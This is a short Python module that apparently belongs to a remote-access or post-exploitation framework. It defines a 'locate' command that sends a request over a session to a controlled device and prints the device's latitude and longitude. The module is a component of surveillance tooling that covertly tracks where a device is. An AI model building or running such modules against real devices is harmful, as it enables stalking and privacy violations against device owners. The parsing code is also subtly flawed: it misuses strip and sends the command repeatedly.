#!/usr/bin/env python3

import core.helper as h

class command:
    def __init__(self):
        self.name = "locate"
        self.description = "Locate device."
    
    def run(self,session,cmd_data):
        if session.send_command(cmd_data).decode().split("\n")[0] == "Unable to get Coordinates":
            h.info_error("Failed to locate device!")
        else:
            latitude = session.send_command(cmd_data).decode().split("\n")[0].strip("Latitude : ")
            longitude = session.send_command(cmd_data).decode().split("\n")[1].strip("Longitude : ")
            h.info_info("Latitude: "+latitude)
            h.info_info("Longitude: "+longitude)
